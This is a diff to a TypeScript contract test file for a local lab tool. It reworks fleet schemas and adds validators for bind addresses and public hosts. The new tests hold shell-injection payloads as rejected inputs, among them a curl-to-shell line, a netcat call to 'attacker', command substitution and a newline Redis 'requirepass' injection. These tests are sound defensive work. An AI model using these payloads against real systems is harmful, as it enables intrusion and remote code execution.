@@ -8,13 +8,19 @@ import {
   FleetNetworkSchema,
   FleetNodeEffectiveSchema,
   FleetNodeSchema,
-  FleetPendingSchema,
   FleetTombstoneSchema,
   FleetVerifyReportSchema,
   HostInfoSchema,
   LayersManifestSchema,
 } from './schemas/fleet';
-import { BranchCheckoutResultSchema, StackConfigSchema, StackSlotSchema } from './schemas/stack';
+import {
+  BranchCheckoutResultSchema,
+  isBindAddress,
+  isPublicHost,
+  LanConfigSchema,
+  StackConfigSchema,
+  StackSlotSchema,
+} from './schemas/stack';
 import { StatusSchema } from './schemas/status';
 import { PlanJsonSchema, PostTestEventSchema, ResultStatusSchema, TestResultSchema } from './schemas/test';
 
@@ -58,6 +64,7 @@ const EXPECTED_ROUTES = [
   'resetMachine',
   'execMachine',
   'getMachineConsoleLog',
+  'getMachineBootTrail',
   'baremetalPower',
   'getHost',
   'listHostNics',
@@ -69,6 +76,7 @@ const EXPECTED_ROUTES = [
   'putZonesConfig',
   'previewFleetApplyPlan',
   'getFleetVerify',
+  'getFleetBootReadiness',
   'healFleet',
   'getDevPubkey',
   'putFleetConfig',
@@ -140,8 +148,8 @@ describe('local-lab contract', () => {
   it('startStackRun accepts an optional force flag (defaulting to false)', () => {
     const route = contract.startStackRun;
     if (!isAppRoute(route) || !route.body) throw new Error('startStackRun body missing');
-    expect(route.body.parse({ opId: 'fleet-mode-apply' })).toMatchObject({ force: false });
-    expect(route.body.parse({ opId: 'fleet-mode-apply', force: true })).toMatchObject({ force: true });
+    expect(route.body.parse({ opId: 'fleet-planes-apply' })).toMatchObject({ force: false });
+    expect(route.body.parse({ opId: 'fleet-planes-apply', force: true })).toMatchObject({ force: true });
   });
 
   it('startStackRun 409 carries an optional activeJobs count', () => {
@@ -170,9 +178,9 @@ describe('local-lab contract', () => {
     expect(
       route.responses[200].parse({
         ok: true,
-        rejected: [{ path: 'fleet.mode', reason: 'pinned', detail: 'FLEET_MODE' }],
+        rejected: [{ path: 'fleet.nodes.cpu-1', reason: 'tombstoned', detail: 'enable = false' }],
       }),
-    ).toMatchObject({ rejected: [{ path: 'fleet.mode', reason: 'pinned' }] });
+    ).toMatchObject({ rejected: [{ path: 'fleet.nodes.cpu-1', reason: 'tombstoned' }] });
     expect(() => route.responses[200].parse({ ok: true })).toThrow();
   });
 
@@ -288,7 +296,7 @@ describe('local-lab contract', () => {
   });
 
   it('HostInfoSchema requires the ccBuild stamp block', () => {
-    const base = { os: 'linux', arch: 'amd64', passthroughSupported: true, lanIp: '192.168.1.2' };
+    const base = { os: 'linux', arch: 'amd64', passthroughSupported: true };
     const ccBuild = { sha: null, builtAt: null, headSha: null, stale: false };
     expect(HostInfoSchema.parse({ ...base, ccBuild }).ccBuild).toEqual(ccBuild);
     const full = { sha: 'a'.repeat(40), builtAt: 1_700_000_000_000, headSha: 'b'.repeat(40), stale: true };
@@ -296,20 +304,8 @@ describe('local-lab contract', () => {
     expect(() => HostInfoSchema.parse(base)).toThrow();
   });
 
-  it('FleetPending severity accepts mode-change', () => {
-    const base = {
-      inSync: false,
-      severity: 'mode-change' as const,
-      desiredDigest: 'sha256:x',
-      appliedDigest: 'sha256:y',
-      appliedAt: 1,
-      summary: { added: 0, removed: 0, changed: 0, unchanged: 0 },
-      nodes: { added: [], removed: [], changed: [] },
-      network: { changed: false, fields: [] },
-      note: null,
-    };
-    expect(FleetPendingSchema.parse(base).severity).toBe('mode-change');
-    expect(() => FleetPendingSchema.parse({ ...base, severity: 'nonsense' })).toThrow();
+  it('HostInfoSchema declares no lanIp field', () => {
+    expect(Object.keys(HostInfoSchema.shape)).not.toContain('lanIp');
   });
 
   it('LayersManifestSchema accepts a realistic sample and retains unknown keys via passthrough', () => {
@@ -446,7 +442,7 @@ describe('local-lab contract', () => {
 
   const fleetConfig = (nodes: ReturnType<typeof fleetNode>[]) => ({
     source: 'default',
-    mode: 'vm',
+    planes: { vm: true, baremetal: false },
     baremetal: { nics: [], arch: 'amd64', nodes: [] },
     bakedChainUrl: null,
     nodes,
@@ -486,11 +482,11 @@ describe('local-lab contract', () => {
     const route = contract.putFleetConfig;
     if (!isAppRoute(route) || !route.body) throw new Error('putFleetConfig has no body');
     const base = {
-      mode: 'vm',
       nodes: [fleetNode()],
       baremetal: { nics: [], arch: 'amd64', bmcDefaults: { username: '', password: '' }, nodes: [] },
     };
     expect(route.body.parse(base)).not.toHaveProperty('prune');
+    expect(route.body.parse(base)).not.toHaveProperty('mode');
     expect(route.body.parse({ ...base, network: fleetNetwork({ dhcp: true }), prune: ['cpu-3'] })).toMatchObject({
       network: { dhcp: true },
       prune: ['cpu-3'],
@@ -565,7 +561,6 @@ describe('local-lab contract', () => {
     const route = contract.putFleetConfig;
     if (!isAppRoute(route) || !route.body) throw new Error('putFleetConfig body missing');
     const parsed = route.body.parse({
-      mode: 'vm',
       nodes: [fleetNode({ effective_ip: '192.168.200.10', effective_bmc_ip: '192.168.105.10' })],
       baremetal: { nics: [], arch: 'amd64', bmcDefaults: { username: '', password: '' }, nodes: [] },
     });
@@ -573,12 +568,14 @@ describe('local-lab contract', () => {
     expect(parsed.nodes[0]).not.toHaveProperty('effective_bmc_ip');
   });
 
-  it('FleetVerifyReportSchema.mode narrows to vm/baremetal/unknown and rejects other strings', () => {
+  it('FleetVerifyReportSchema.planes takes the two booleans or null and rejects a mode string', () => {
     const base = { status: 'healthy' as const, findings: [], summary: { checked: 0, ok: 0, findings: 0 } };
-    for (const mode of ['vm', 'baremetal', 'unknown'] as const) {
-      expect(FleetVerifyReportSchema.parse({ ...base, mode }).mode).toBe(mode);
-    }
-    expect(() => FleetVerifyReportSchema.parse({ ...base, mode: 'qemu' })).toThrow();
+    expect(FleetVerifyReportSchema.parse({ ...base, planes: { vm: true, baremetal: false } }).planes).toEqual({
+      vm: true,
+      baremetal: false,
+    });
+    expect(FleetVerifyReportSchema.parse({ ...base, planes: null }).planes).toBeNull();
+    expect(() => FleetVerifyReportSchema.parse({ ...base, planes: 'vm' })).toThrow();
   });
 
   it('StackSlotSchema accepts slot 0 and 46', () => {
@@ -600,14 +597,102 @@ describe('local-lab contract', () => {
       servicePorts: [],
       values: { hub: {}, spoke: {} },
       topology: { zones: 1, bridges: 1 },
-      identity: { pg: { user: 'u', password: 'p', db: 'd' }, orgId: 'o' },
+      identity: {
+        pg: { user: 'u', password: 'p', db: 'd' },
+        orgId: 'o',
+        redis: { password: 'p' },
+        mailpit: { password: 'p' },
+      },
       osLayerCache: { originHost: '', resolvers: '' },
-      lan: { expose: false },
+      lan: { mode: 'loopback', bindAddress: '', publicHost: '', datastoreAuth: true, expose: false },
       telemetry: { enable: false },
       slot: 2,
     };
     expect(StackConfigSchema.parse(base).slot).toBe(2);
     expect(() => StackConfigSchema.parse({ ...base, slot: 47 })).toThrow();
+  });
+
+  it('accepts an ipv4 bind address', () => {
+    for (const v of ['0.0.0.0', '127.0.0.1', '10.0.0.4', '255.255.255.255']) {
+      expect(isBindAddress(v), v).toBe(true);
+    }
+  });
+
+  it('accepts an ipv6 bind address in its compressed, full and ipv4-tailed forms', () => {
+    for (const v of ['::', '::1', 'fe80::1', '2001:0db8:0000:0000:0000:8a2e:0370:7334', '::ffff:192.168.1.1']) {
+      expect(isBindAddress(v), v).toBe(true);
+    }
+  });
+
+  it('accepts the empty string that means every interface, and refuses every hostname', () => {
+    expect(isBindAddress(''), '').toBe(true);
+    for (const v of ['localhost', 'lab.internal', 'my-host.example.com', 'example.com.']) {
+      expect(isBindAddress(v), v).toBe(false);
+    }
+  });
+
+  it('accepts in the public host every name the bind address refuses', () => {
+    for (const v of ['', 'localhost', 'lab.internal', 'my-host.example.com', 'example.com.']) {
+      expect(isPublicHost(v), v).toBe(true);
+    }
+  });
+
+  it('holds the public host to the same shape gate as the bind address', () => {
+    for (const v of ['$(whoami)', '10.0.0.1\nrequirepass owned', '0.0.0.0 ', '256.1.1.1', 'fe80::1%eth0', 'a..b']) {
+      expect(isPublicHost(v), v).toBe(false);
+    }
+  });
+
+  it('refuses a shell metacharacter payload, which is the whole reason this gate exists', () => {
+    for (const v of [
+      '0.0.0.0; curl evil | sh',
+      '0.0.0.0 && reboot',
+      '$(whoami)',
+      '`id`',
+      '10.0.0.1|nc attacker 1',
+      '10.0.0.1\nrequirepass owned',
+      "10.0.0.1'",
+      '10.0.0.1"',
+      'evil$IFS',
+      '0.0.0.0 ',
+    ]) {
+      expect(isBindAddress(v), v).toBe(false);
+    }
+  });
+
+  it('refuses a malformed address that is not a legal ip', () => {
+    for (const v of ['256.1.1.1', '010.0.0.1', 'fe80::1%eth0', '1:2:3:4:5:6:7:8:9', ':::1', 'a..b', '-lead']) {
+      expect(isBindAddress(v), v).toBe(false);
+    }
+  });
+
+  it('LanConfigSchema takes the three network modes and refuses anything else', () => {
+    for (const mode of ['loopback', 'direct', 'fronted']) {
+      expect(
+        LanConfigSchema.parse({ mode, bindAddress: '', publicHost: '', datastoreAuth: true, expose: false }).mode,
+      ).toBe(mode);
+    }
+    expect(() =>
+      LanConfigSchema.parse({ mode: 'open', bindAddress: '', publicHost: '', datastoreAuth: true, expose: false }),
+    ).toThrow();
+  });
+
+  it('keeps the deprecated expose alias on LanConfigSchema so an existing overlay still parses', () => {
+    expect(
+      LanConfigSchema.parse({
+        mode: 'direct',
+        bindAddress: '10.0.0.4',
+        publicHost: 'dev-box.local',
+        datastoreAuth: false,
+        expose: true,
+      }),
+    ).toEqual({
+      mode: 'direct',
+      bindAddress: '10.0.0.4',
+      publicHost: 'dev-box.local',
+      datastoreAuth: false,
+      expose: true,
+    });
   });
 
   it('putStackConfig body accepts an optional slot and declares a 409 conflict response', () => {
